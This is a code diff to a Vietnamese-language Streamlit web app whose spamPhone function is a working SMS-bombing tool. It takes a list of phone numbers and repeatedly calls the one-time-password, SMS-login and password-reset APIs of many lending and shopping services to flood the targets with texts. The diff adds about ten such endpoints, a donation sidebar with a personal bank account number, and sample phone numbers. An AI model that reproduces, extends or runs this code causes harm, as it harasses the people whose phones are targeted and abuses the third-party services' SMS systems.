@@ -69,6 +69,27 @@ class App:
         '''
         components.html(script)
         st.markdown(script, unsafe_allow_html=True)
+    def createSidebar(self):
+        st.sidebar.text("Nếu có thắc mắc\nVui lòng liên hệ Thầy Trường!")
+        st.sidebar.markdown("[Liên Hệ Thầy Trường](https://www.facebook.com/100029031824085)", unsafe_allow_html=True)
+        st.sidebar.write("Liên Kết MXH Khác:")
+        link = '[Youtube](https://www.youtube.com/channel/UCR33v6d0J3ia4T69_7dUITA) <br> [Github](https://github.com/truongjae)'
+        st.sidebar.markdown(link, unsafe_allow_html=True)
+        code = '''print("Ủng hộ chất xám của thầy")\nprint("Nhớ đôn lết cho thầy nha!")'''
+        st.sidebar.code(code, language='python')
+        st.sidebar.write("STK: ")
+        code = '''0345382198'''
+        st.sidebar.code(code, language='python')
+        st.sidebar.write("Tên TK: ")
+        code = '''nguyen gia truong'''.upper()
+        st.sidebar.code(code, language='python')
+        st.sidebar.write("Ngân Hàng: ")
+        code = '''MB Bank'''
+        st.sidebar.code(code, language='python')
+        st.sidebar.write("Tiện Ích Khác: ")
+        link = '[Tool Facebook Siêu Cấp](https://share.streamlit.io/truongjae/fbtools-truongjae/main/main.py) <br> [Google Đọc Bình Luận Livestream](https://www.youtube.com/watch?v=uy3J7G0WhKg)'
+        st.sidebar.markdown(link, unsafe_allow_html=True)
+        st.sidebar.write("Copyright Truongjae 2022 ©")
     @st.cache(suppress_st_warning=True)
     def spamPhone(self,arrPhone):
         sdt = arrPhone.split(",")
@@ -93,7 +114,22 @@ class App:
                 pload = {"phone":phone}
                 requests.post("https://gateway.chotot.com/v2/public/auth/send_otp_verify",json=pload)
                 pload = {"mobile": phone}
-                requests.post("https://api.magpiecredit.com/user/sendCode-h5",data=pload)   
+                requests.post("https://api.magpiecredit.com/user/sendCode-h5",data=pload)
+                data = {"loan_phone": phone,"action": "fe_loan_resendotp"}
+                requests.post("https://fecredit.com.vn/wp-admin/admin-ajax.php",data=data)
+                data = {"login":phone}
+                requests.post("https://api.vayvnd.vn/v1/users/password-reset",json=data)
+                data = {"phone": phone,"sign": "67d44dda-b29f-48a4-9830-67121bc618f8"}
+                requests.post("https://api.vtvay.com/v1/verify/sms/send",data= data)
+                data = {"mobile": phone,"companyId":"5e030a2d0683f71328532063","appId":"5e030a1b0683f71328532062","userType":1}
+                requests.post("https://www.hbcredit.cc/sms/login",json=data)
+                data = {"mobile": phone,"companyId":"5e030a2d0683f71328532063","appId":"5e030a1b0683f71328532062","userType":1}
+                requests.post("http://www.vayhome.com/sms/login",json=data)
+                data = {"phone": phone,"sign": "67d44dda-b29f-48a4-9830-67121bc618f8"}
+                requests.post("https://api.tiencash.com/v1/verify/sms/send",data=data)
+                requests.post("https://webapp.okmoney.cc/_api/auth/login/sms?mobile="+phone)
+                data = {"mobile": phone}
+                requests.post("http://h5.postvay.com/_api/auth/login/sms",data = data)
                 i+=1
                 if i==len(sdt):
                     i=0
@@ -111,7 +147,8 @@ class App:
         }
         requests.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSdhLpU6k8D2mPFvLNBqVGWks5qq6ZbczgJO1z0DKJkLKnXVNA/formResponse",data=data)
     def run(self):
-        mobile_number=st.text_input("Nhập số điện thoại: ",help= "Nếu nhiều sdt thì ngăn cách nhau bởi dấu phẩy")
+        self.createSidebar()
+        mobile_number=st.text_input("Nhập số điện thoại: ",placeholder="Nếu nhiều sdt thì ngăn cách nhau bởi dấu phẩy VD: 0935115536,0365452365,0854625548",help= "Nếu nhiều sdt thì ngăn cách nhau bởi dấu phẩy")
         col1, col2, col3 = st.columns(3)
         sumSpam = int(time.time())
         success = sumSpam-(sumSpam//(sumSpam%999))
